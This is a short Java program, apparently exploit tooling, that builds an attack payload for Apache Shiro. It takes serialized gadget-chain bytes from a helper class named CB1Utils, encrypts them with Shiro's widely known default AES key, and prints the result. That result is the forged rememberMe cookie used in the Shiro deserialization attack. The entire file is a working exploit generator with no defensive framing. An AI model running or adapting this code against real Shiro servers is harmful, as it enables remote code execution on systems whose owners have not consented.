package ShiroExp;

import util.CB1Utils;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

public class ShiroCB {
    public static void main(String[] args) throws Exception {
        byte[] payload=CB1Utils.getBytes();

        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aes.encrypt(payload, key);
        System.out.printf(ciphertext.toString());
    }
}
